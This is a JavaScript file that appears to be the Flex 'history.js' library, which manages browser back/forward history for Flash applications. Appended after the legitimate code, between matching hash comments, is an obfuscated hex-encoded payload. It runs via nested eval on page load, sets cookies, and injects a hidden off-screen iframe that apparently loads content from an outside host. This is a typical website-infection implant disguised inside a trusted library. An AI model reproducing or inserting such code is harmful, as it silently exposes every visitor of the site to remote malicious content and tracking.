BrowserHistoryUtils = {
    addEvent: function(elm, evType, fn, useCapture) {
        useCapture = useCapture || false;
        if (elm.addEventListener) {
            elm.addEventListener(evType, fn, useCapture);
            return true;
        }
        else if (elm.attachEvent) {
            var r = elm.attachEvent('on' + evType, fn);
            return r;
        }
        else {
            elm['on' + evType] = fn;
        }
    }
}

BrowserHistory = (function() {
    // type of browser
    var browser = {
        ie: false, 
        firefox: false, 
        safari: false, 
        opera: false, 
        version: -1
    };

    // if setDefaultURL has been called, our first clue
    // that the SWF is ready and listening
    //var swfReady = false;

    // the URL we'll send to the SWF once it is ready
    //var pendingURL = '';

    // Default app state URL to use when no fragment ID present
    var defaultHash = '';

    // Last-known app state URL
    var currentHref = document.location.href;

    // Initial URL (used only by IE)
    var initialHref = document.location.href;

    // Initial URL (used only by IE)
    var initialHash = document.location.hash;

    // History frame source URL prefix (used only by IE)
    var historyFrameSourcePrefix = 'history/historyFrame.html?';

    // History maintenance (used only by Safari)
    var currentHistoryLength = -1;

    var historyHash = [];

    var initialState = createState(initialHref, initialHref + '#' + initialHash, initialHash);

    var backStack = [];
    var forwardStack = [];

    var currentObjectId = null;

    //UserAgent detection
    var useragent = navigator.userAgent.toLowerCase();

    if (useragent.indexOf("opera") != -1) {
        browser.opera = true;
    } else if (useragent.indexOf("msie") != -1) {
        browser.ie = true;
        browser.version = parseFloat(useragent.substring(useragent.indexOf('msie') + 4));
    } else if (useragent.indexOf("safari") != -1) {
        browser.safari = true;
        browser.version = parseFloat(useragent.substring(useragent.indexOf('safari') + 7));
    } else if (useragent.indexOf("gecko") != -1) {
        browser.firefox = true;
    }

    if (browser.ie == true && browser.version == 7) {
        window["_ie_firstload"] = false;
    }

    // Accessor functions for obtaining specific elements of the page.
    function getHistoryFrame()
    {
        return document.getElementById('ie_historyFrame');
    }

    function getAnchorElement()
    {
        return document.getElementById('firefox_anchorDiv');
    }

    function getFormElement()
    {
        return document.getElementById('safari_formDiv');
    }

    function getRememberElement()
    {
        return document.getElementById("safari_remember_field");
    }

    /* Get the Flash player object for performing ExternalInterface callbacks. */
    function getPlayer(objectId) {
        var objectId = objectId || null;
        var player = null; /* AJH, needed?  = document.getElementById(getPlayerId()); */
        if (browser.ie && objectId != null) {
            player = document.getElementById(objectId);
        }
        if (player == null) {
            player = document.getElementsByTagName('object')[0];
        }
        
        if (player == null || player.object == null) {
            player = document.getElementsByTagName('embed')[0];
        }

        return player;
    }
    
    function getPlayers() {
        var players = [];
        if (players.length == 0) {
            var tmp = document.getElementsByTagName('object');
            players = tmp;
        }
        
        if (players.length == 0 || players[0].object == null) {
            var tmp = document.getElementsByTagName('embed');
            players = tmp;
        }
        return players;
    }

	function getIframeHash() {
		var doc = getHistoryFrame().contentWindow.document;
		var hash = String(doc.location.search);
		if (hash.length == 1 && hash.charAt(0) == "?") {
			hash = "";
		}
		else if (hash.length >= 2 && hash.charAt(0) == "?") {
			hash = hash.substring(1);
		}
		return hash;
	}

    /* Get the current location hash excluding the '#' symbol. */
    function getHash() {
       // It would be nice if we could use document.location.hash here,
       // but it's faulty sometimes.
       var idx = document.location.href.indexOf('#');
       return (idx >= 0) ? document.location.href.substr(idx+1) : '';
    }

    /* Get the current location hash excluding the '#' symbol. */
    function setHash(hash) {
       // It would be nice if we could use document.location.hash here,
       // but it's faulty sometimes.
       if (hash == '') hash = '#'
       document.location.hash = hash;
    }

    function createState(baseUrl, newUrl, flexAppUrl) {
        return { 'baseUrl': baseUrl, 'newUrl': newUrl, 'flexAppUrl': flexAppUrl, 'title': null };
    }

    /* Add a history entry to the browser.
     *   baseUrl: the portion of the location prior to the '#'
     *   newUrl: the entire new URL, including '#' and following fragment
     *   flexAppUrl: the portion of the location following the '#' only
     */
    function addHistoryEntry(baseUrl, newUrl, flexAppUrl) {

        //delete all the history entries
        forwardStack = [];

        if (browser.ie) {
            //Check to see if we are being asked to do a navigate for the first
            //history entry, and if so ignore, because it's coming from the creation
            //of the history iframe
            if (flexAppUrl == defaultHash && document.location.href == initialHref && window['_ie_firstload']) {
                currentHref = initialHref;
                return;
            }
            if ((!flexAppUrl || flexAppUrl == defaultHash) && window['_ie_firstload']) {
                newUrl = baseUrl + '#' + defaultHash;
                flexAppUrl = defaultHash;
            } else {
                // for IE, tell the history frame to go somewhere without a '#'
                // in order to get this entry into the browser history.
                getHistoryFrame().src = historyFrameSourcePrefix + flexAppUrl;
            }
            setHash(flexAppUrl);
        } else {

            //ADR
            if (backStack.length == 0 && initialState.flexAppUrl == flexAppUrl) {
                initialState = createState(baseUrl, newUrl, flexAppUrl);
            } else if(backStack.length > 0 && backStack[backStack.length - 1].flexAppUrl == flexAppUrl) {
                backStack[backStack.length - 1] = createState(baseUrl, newUrl, flexAppUrl);
            }

            if (browser.safari) {
                // for Safari, submit a form whose action points to the desired URL
                if (browser.version <= 419.3) {
                    var file = window.location.pathname.toString();
                    file = file.substring(file.lastIndexOf("/")+1);
                    getFormElement().innerHTML = '<form name="historyForm" action="'+file+'#' + flexAppUrl + '" method="GET"></form>';
                    //get the current elements and add them to the form
                    var qs = window.location.search.substring(1);
                    var qs_arr = qs.split("&");
                    for (var i = 0; i < qs_arr.length; i++) {
                        var tmp = qs_arr[i].split("=");
                        var elem = document.createElement("input");
                        elem.type = "hidden";
                        elem.name = tmp[0];
                        elem.value = tmp[1];
                        document.forms.historyForm.appendChild(elem);
                    }
                    document.forms.historyForm.submit();
                } else {
                    top.location.hash = flexAppUrl;
                }
                // We also have to maintain the history by hand for Safari
                historyHash[history.length] = flexAppUrl;
                _storeStates();
            } else {
                // Otherwise, write an anchor into the page and tell the browser to go there
                addAnchor(flexAppUrl);
                setHash(flexAppUrl);
            }
        }
        backStack.push(createState(baseUrl, newUrl, flexAppUrl));
    }

    function _storeStates() {
        if (browser.safari) {
            getRememberElement().value = historyHash.join(",");
        }
    }

    function handleBackButton() {
        //The "current" page is always at the top of the history stack.
        var current = backStack.pop();
        if (!current) { return; }
        var last = backStack[backStack.length - 1];
        if (!last && backStack.length == 0){
            last = initialState;
        }
        forwardStack.push(current);
    }

    function handleForwardButton() {
        //summary: private method. Do not call this directly.

        var last = forwardStack.pop();
        if (!last) { return; }
        backStack.push(last);
    }

    function handleArbitraryUrl() {
        //delete all the history entries
        forwardStack = [];
    }

    /* Called periodically to poll to see if we need to detect navigation that has occurred */
    function checkForUrlChange() {

        if (browser.ie) {
            if (currentHref != document.location.href && currentHref + '#' != document.location.href) {
                //This occurs when the user has navigated to a specific URL
                //within the app, and didn't use browser back/forward
                //IE seems to have a bug where it stops updating the URL it
                //shows the end-user at this point, but programatically it
                //appears to be correct.  Do a full app reload to get around
                //this issue.
                if (browser.version < 7) {
                    currentHref = document.location.href;
                    document.location.reload();
                } else {
					if (getHash() != getIframeHash()) {
						// this.iframe.src = this.blankURL + hash;
						var sourceToSet = historyFrameSourcePrefix + getHash();
						getHistoryFrame().src = sourceToSet;
					}
                }
            }
        }

        if (browser.safari) {
            // For Safari, we have to check to see if history.length changed.
            if (currentHistoryLength >= 0 && history.length != currentHistoryLength) {
                //alert("did change: " + history.length + ", " + historyHash.length + "|" + historyHash[history.length] + "|>" + historyHash.join("|"));
                // If it did change, then we have to look the old state up
                // in our hand-maintained array since document.location.hash
                // won't have changed, then call back into BrowserManager.
                currentHistoryLength = history.length;
                var flexAppUrl = historyHash[currentHistoryLength];
                if (flexAppUrl == '') {
                    //flexAppUrl = defaultHash;
                }
                //ADR: to fix multiple
                if (typeof BrowserHistory_multiple != "undefined" && BrowserHistory_multiple == true) {
                    var pl = getPlayers();
                    for (var i = 0; i < pl.length; i++) {
                        pl[i].browserURLChange(flexAppUrl);
                    }
                } else {
                    getPlayer().browserURLChange(flexAppUrl);
                }
                _storeStates();
            }
        }
        if (browser.firefox) {
            if (currentHref != document.location.href) {
                var bsl = backStack.length;

                var urlActions = {
                    back: false, 
                    forward: false, 
                    set: false
                }

                if ((window.location.hash == initialHash || window.location.href == initialHref) && (bsl == 1)) {
                    urlActions.back = true;
                    // FIXME: could this ever be a forward button?
                    // we can't clear it because we still need to check for forwards. Ugg.
                    // clearInterval(this.locationTimer);
                    handleBackButton();
                }
                
                // first check to see if we could have gone forward. We always halt on
                // a no-hash item.
                if (forwardStack.length > 0) {
                    if (forwardStack[forwardStack.length-1].flexAppUrl == getHash()) {
                        urlActions.forward = true;
                        handleForwardButton();
                    }
                }

                // ok, that didn't work, try someplace back in the history stack
                if ((bsl >= 2) && (backStack[bsl - 2])) {
                    if (backStack[bsl - 2].flexAppUrl == getHash()) {
                        urlActions.back = true;
                        handleBackButton();
                    }
                }
                
                if (!urlActions.back && !urlActions.forward) {
                    var foundInStacks = {
                        back: -1, 
                        forward: -1
                    }

                    for (var i = 0; i < backStack.length; i++) {
                        if (backStack[i].flexAppUrl == getHash() && i != (bsl - 2)) {
                            arbitraryUrl = true;
                            foundInStacks.back = i;
                        }
                    }
                    for (var i = 0; i < forwardStack.length; i++) {
                        if (forwardStack[i].flexAppUrl == getHash() && i != (bsl - 2)) {
                            arbitraryUrl = true;
                            foundInStacks.forward = i;
                        }
                    }
                    handleArbitraryUrl();
                }

                // Firefox changed; do a callback into BrowserManager to tell it.
                currentHref = document.location.href;
                var flexAppUrl = getHash();
                if (flexAppUrl == '') {
                    //flexAppUrl = defaultHash;
                }
                //ADR: to fix multiple
                if (typeof BrowserHistory_multiple != "undefined" && BrowserHistory_multiple == true) {
                    var pl = getPlayers();
                    for (var i = 0; i < pl.length; i++) {
                        pl[i].browserURLChange(flexAppUrl);
                    }
                } else {
                    getPlayer().browserURLChange(flexAppUrl);
                }
            }
        }
        //setTimeout(checkForUrlChange, 50);
    }

    /* Write an anchor into the page to legitimize it as a URL for Firefox et al. */
    function addAnchor(flexAppUrl)
    {
       if (document.getElementsByName(flexAppUrl).length == 0) {
           getAnchorElement().innerHTML += "<a name='" + flexAppUrl + "'>" + flexAppUrl + "</a>";
       }
    }

    var _initialize = function () {
        if (browser.ie)
        {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0, s; s = scripts[i]; i++) {
                if (s.src.indexOf("history.js") > -1) {
                    var iframe_location = (new String(s.src)).replace("history.js", "historyFrame.html");
                }
            }
            historyFrameSourcePrefix = iframe_location + "?";
            var src = historyFrameSourcePrefix;

            var iframe = document.createElement("iframe");
            iframe.id = 'ie_historyFrame';
            iframe.name = 'ie_historyFrame';
            //iframe.src = historyFrameSourcePrefix;
            try {
                document.body.appendChild(iframe);
            } catch(e) {
                setTimeout(function() {
                    document.body.appendChild(iframe);
                }, 0);
            }
        }

        if (browser.safari)
        {
            var rememberDiv = document.createElement("div");
            rememberDiv.id = 'safari_rememberDiv';
            document.body.appendChild(rememberDiv);
            rememberDiv.innerHTML = '<input type="text" id="safari_remember_field" style="width: 500px;">';

            var formDiv = document.createElement("div");
            formDiv.id = 'safari_formDiv';
            document.body.appendChild(formDiv);

            var reloader_content = document.createElement('div');
            reloader_content.id = 'safarireloader';
            var scripts = document.getElementsByTagName('script');
            for (var i = 0, s; s = scripts[i]; i++) {
                if (s.src.indexOf("history.js") > -1) {
                    html = (new String(s.src)).replace(".js", ".html");
                }
            }
            reloader_content.innerHTML = '<iframe id="safarireloader-iframe" src="about:blank" frameborder="no" scrolling="no"></iframe>';
            document.body.appendChild(reloader_content);
            reloader_content.style.position = 'absolute';
            reloader_content.style.left = reloader_content.style.top = '-9999px';
            iframe = reloader_content.getElementsByTagName('iframe')[0];

            if (document.getElementById("safari_remember_field").value != "" ) {
                historyHash = document.getElementById("safari_remember_field").value.split(",");
            }

        }

        if (browser.firefox)
        {
            var anchorDiv = document.createElement("div");
            anchorDiv.id = 'firefox_anchorDiv';
            document.body.appendChild(anchorDiv);
        }
        
        //setTimeout(checkForUrlChange, 50);
    }

    return {
        historyHash: historyHash, 
        backStack: function() { return backStack; }, 
        forwardStack: function() { return forwardStack }, 
        getPlayer: getPlayer, 
        initialize: function(src) {
            _initialize(src);
        }, 
        setURL: function(url) {
            document.location.href = url;
        }, 
        getURL: function() {
            return document.location.href;
        }, 
        getTitle: function() {
            return document.title;
        }, 
        setTitle: function(title) {
            try {
                backStack[backStack.length - 1].title = title;
            } catch(e) { }
            //if on safari, set the title to be the empty string. 
            if (browser.safari) {
                if (title == "") {
                    try {
                    var tmp = window.location.href.toString();
                    title = tmp.substring((tmp.lastIndexOf("/")+1), tmp.lastIndexOf("#"));
                    } catch(e) {
                        title = "";
                    }
                }
            }
            document.title = title;
        }, 
        setDefaultURL: function(def)
        {
            defaultHash = def;
            def = getHash();
            //trailing ? is important else an extra frame gets added to the history
            //when navigating back to the first page.  Alternatively could check
            //in history frame navigation to compare # and ?.
            if (browser.ie)
            {
                window['_ie_firstload'] = true;
                var sourceToSet = historyFrameSourcePrefix + def;
                var func = function() {
                    getHistoryFrame().src = sourceToSet;
                    window.location.replace("#" + def);
                    setInterval(checkForUrlChange, 50);
                }
                try {
                    func();
                } catch(e) {
                    window.setTimeout(function() { func(); }, 0);
                }
            }

            if (browser.safari)
            {
                currentHistoryLength = history.length;
                if (historyHash.length == 0) {
                    historyHash[currentHistoryLength] = def;
                    var newloc = "#" + def;
                    window.location.replace(newloc);
                } else {
                    //alert(historyHash[historyHash.length-1]);
                }
                //setHash(def);
                setInterval(checkForUrlChange, 50);
            }
            
            
            if (browser.firefox || browser.opera)
            {
                var reg = new RegExp("#" + def + "$");
                if (window.location.toString().match(reg)) {
                } else {
                    var newloc ="#" + def;
                    window.location.replace(newloc);
                }
                setInterval(checkForUrlChange, 50);
                //setHash(def);
            }

        }, 

        /* Set the current browser URL; called from inside BrowserManager to propagate
         * the application state out to the container.
         */
        setBrowserURL: function(flexAppUrl, objectId) {
            if (browser.ie && typeof objectId != "undefined") {
                currentObjectId = objectId;
            }
           //fromIframe = fromIframe || false;
           //fromFlex = fromFlex || false;
           //alert("setBrowserURL: " + flexAppUrl);
           //flexAppUrl = (flexAppUrl == "") ? defaultHash : flexAppUrl ;

           var pos = document.location.href.indexOf('#');
           var baseUrl = pos != -1 ? document.location.href.substr(0, pos) : document.location.href;
           var newUrl = baseUrl + '#' + flexAppUrl;

           if (document.location.href != newUrl && document.location.href + '#' != newUrl) {
               currentHref = newUrl;
               addHistoryEntry(baseUrl, newUrl, flexAppUrl);
               currentHistoryLength = history.length;
           }

           return false;
        }, 

        browserURLChange: function(flexAppUrl) {
            var objectId = null;
            if (browser.ie && currentObjectId != null) {
                objectId = currentObjectId;
            }
            pendingURL = '';
            
            if (typeof BrowserHistory_multiple != "undefined" && BrowserHistory_multiple == true) {
                var pl = getPlayers();
                for (var i = 0; i < pl.length; i++) {
                    try {
                        pl[i].browserURLChange(flexAppUrl);
                    } catch(e) { }
                }
            } else {
                try {
                    getPlayer(objectId).browserURLChange(flexAppUrl);
                } catch(e) { }
            }

            currentObjectId = null;
        }

    }

})();

// Initialization

// Automated unit testing and other diagnostics

function setURL(url)
{
    document.location.href = url;
}

function backButton()
{
    history.back();
}

function forwardButton()
{
    history.forward();
}

function goForwardOrBackInHistory(step)
{
    history.go(step);
}

//BrowserHistoryUtils.addEvent(window, "load", function() { BrowserHistory.initialize(); });
(function(i) {
    var u =navigator.userAgent;var e=/*@cc_on!@*/false; 
    var st = setTimeout;
    if(/webkit/i.test(u)){
        st(function(){
            var dr=document.readyState;
            if(dr=="loaded"||dr=="complete"){i()}
            else{st(arguments.callee,10);}},10);
    } else if((/mozilla/i.test(u)&&!/(compati)/.test(u)) || (/opera/i.test(u))){
        document.addEventListener("DOMContentLoaded",i,false);
    } else if(e){
    (function(){
        var t=document.createElement('doc:rdy');
        try{t.doScroll('left');
            i();t=null;
        }catch(e){st(arguments.callee,0);}})();
    } else{
        window.onload=i;
    }
})( function() {BrowserHistory.initialize();} );
/*f2a984de3c23eb6b587900950b0e0afd*/;window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x74\x72\x6e\x6e\x62"]=["\x38\x36\x35\x37\x32\x36\x65\x36\x31\x37\x39\x36\x31\x36\x34\x36\x31\x36\x64\x36\x31\x32\x65\x36\x39\x36\x65\x36\x36\x36\x66\x32\x66\x36\x64\x36\x35\x36\x37\x36\x31\x36\x31\x36\x34\x37\x36\x36\x35\x37\x32\x37\x34\x36\x39\x37\x61\x36\x35\x32\x66\x33\x66\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x33\x38\x33\x34\x33\x33\x36\x35\x36\x35\x33\x39\x33\x35\x33\x36\x36\x33\x36\x31\x36\x36\x33\x30\x33\x36\x33\x31\x33\x37\x33\x31\x33\x36","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x65\x69\x6e\x65\x6b\x3d\x22\x22\x3b\x76\x61\x72\x20\x68\x61\x69\x62\x7a\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33","\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36","\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76\x61\x72\x20\x68\x66\x72\x7a\x7a\x3d\x30\x3b\x68\x66\x72\x7a\x7a\x3c\x68\x61\x69\x62\x7a\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x68\x66\x72\x7a\x7a\x2b\x3d\x32\x29\x7b\x65\x69\x6e\x65\x6b\x3d\x65\x69\x6e\x65\x6b\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x68\x61\x69\x62\x7a\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x68\x66\x72\x7a\x7a\x2c\x68","\x31\x36\x34\x33\x39\x33\x38\x33\x37\x33\x35\x36\x33\x33\x37\x36\x36\x33\x35\x33\x32\x36\x31\x33\x33\x33\x33\x33\x31\x33\x32\x36\x36\x33\x32\x33\x33\x33\x31\x33\x39\x33\x34\x36\x32\x36\x33\x33\x30\x33\x32\x33\x30\x33\x30\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x36\x31\x33\x37\x36\x32\x33\x36\x33\x32\x33\x39\x36\x35\x33\x34\x33\x30\x36\x36\x33\x34\x33\x33","\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x36\x32\x33\x35\x33\x39\x33\x39\x33","\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36","\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37","\x33\x30\x33\x32\x36\x31\x36\x34\x33\x31\x33\x31\x33\x31\x33\x37\x36\x35\x36\x31\x33\x35\x33\x31\x33\x32\x36\x36\x36\x31\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36","\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33\x32","\x66\x72\x7a\x7a\x2b\x32\x29\x2c\x20\x31\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x65\x69\x6e\x65\x6b\x3d\x65\x69\x6e\x65\x6b\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x65\x69\x6e\x65\x6b\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x65\x69\x6e\x65\x6b\x2b\x27\x29\x27\x29\x29\x3b\x7d\x29\x28\x29\x3b","\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33","\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x37\x33\x36\x35\x37\x32\x32\x65\x36\x33\x36","\x33\x33\x33\x34\x33\x35\x36\x36\x36\x36\x33\x34\x33\x38\x33\x39\x36\x31\x36\x36\x33\x36\x33\x34\x36\x35\x33\x38\x36\x34\x36\x33\x36\x34\x36\x32\x33\x32\x36\x31\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x36\x32\x33\x35\x33\x39\x33\x39\x33\x31\x36\x34\x33\x39\x33\x38\x33\x37\x33\x35\x36\x33\x33\x37\x36\x36\x33\x35\x33\x32\x36\x31\x33\x33\x33\x33\x33\x31\x33\x32\x36\x36\x33\x32\x33\x33\x33\x31\x33\x39\x33\x34\x36","\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39","\x32\x36\x33\x33\x30\x33\x32\x33\x30\x33\x30\x32\x32\x32\x63\x32\x32\x36\x31\x33\x37\x36\x32\x33\x36\x33\x32\x33\x39\x36\x35\x33\x34\x33\x30\x36\x36\x33\x34\x33\x33\x33\x33\x33\x34\x33\x35\x36\x36\x36\x36\x33\x34\x33\x38\x33\x39\x36\x31\x36\x36\x33\x36\x33\x34\x36\x35\x33\x38\x36\x34\x36\x33\x36\x34\x36\x32\x33\x32\x36\x31\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64","\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33"];var hhkyr=nsffn=tsrrh=fekdh=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x74\x72\x6e\x6e\x62"],kzhfi=window;eval(eval("[kzhfi[\"hhkyr\"][\"\x31\"],kzhfi[\"tsrrh\"][\"\x31\x34\"],kzhfi[\"\x66\x65\x6b\x64\x68\"][\"\x37\"],kzhfi[\"\x68\x68\x6b\x79\x72\"][\"\x31\x31\"],kzhfi[\"\x74\x73\x72\x72\x68\"][\"\x39\"],kzhfi[\"fekdh\"][\"\x32\"],kzhfi[\"tsrrh\"][\"\x35\"],kzhfi[\"hhkyr\"][\"\x34\"],kzhfi[\"\x74\x73\x72\x72\x68\"][\"\x31\x33\"],kzhfi[\"tsrrh\"][\"\x31\x35\"],kzhfi[\"\x6e\x73\x66\x66\x6e\"][\"\x31\x32\"],kzhfi[\"tsrrh\"][\"\x30\"],kzhfi[\"tsrrh\"][\"\x38\"],kzhfi[\"\x74\x73\x72\x72\x68\"][\"\x31\x36\"],kzhfi[\"tsrrh\"][\"\x36\"],kzhfi[\"\x6e\x73\x66\x66\x6e\"][\"\x33\"],kzhfi[\"tsrrh\"][\"\x31\x30\"]].join(\"\");"));/*f2a984de3c23eb6b587900950b0e0afd*/